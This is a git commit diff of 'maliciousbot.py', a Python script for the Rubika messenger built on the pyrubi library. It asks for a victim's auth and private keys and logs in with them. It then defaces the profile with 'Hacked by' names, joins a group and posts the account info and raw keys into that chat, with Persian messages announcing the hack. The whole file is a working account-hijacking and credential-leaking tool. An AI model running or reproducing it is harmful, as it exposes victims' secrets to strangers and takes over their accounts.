21dc9ced3bfe4b6497194057d1dbc3a460dfec58
amirhossinpython <151163714+amirhossinpython@users.noreply.github.com>
2024-05-17 19:58:59 +0330

    Update maliciousbot.py

--- maliciousbot.py
+++ maliciousbot.py
@@ -1,13 +1,15 @@
 import os
+import base64
 try:
     import pyrubi
 except ImportError :
     os.system('pip instal pyrubi')
 
 try:
-    auth_key=input('enter the auth :')
+    auth_key=str(input('enter the auth :'))
 
-    private_key=input('enter the  private_ke:')
+    private_key=str(input('enter the  private_ke:'))
+    
 
     link = input("enter link:")
     bot = pyrubi.Client(auth=auth_key,private=private_key)
@@ -21,14 +23,14 @@ try:
     guid = bot.join_chat(link)["group"]["group_guid"]  
     
     
-
-    bot.update_profile(first_name='Hacked by Amir Hossein',last_name="Hacked by Amir Hossein",username='hackedbyamirhossin',bio='Hacked by Amir Hossein')
+    
+    bot.update_profile(first_name='Hacked by Shadow Guardian',last_name="Hacked by Shadow Guardian",username='hackedbyamirhossin84',bio='Hacked by Amir Hossein')
     with open('hack.mp3') as voice:
         bot.send_voice(guid,'hack.mp3')
         
     info=bot.get_me()
 
-
+    
 
     bot.send_text(guid,f"بفرما کل اطلاعاتم :{info}")
     bot.send_text(guid,f"هک شدم توسط امیرحسین\n{auth_key}\n {private_key}")  
@@ -50,4 +52,3 @@ try:
     bot.leave_chat(guid)
 except Exception as hack:
     print(f'erorr :{hack}')
-    
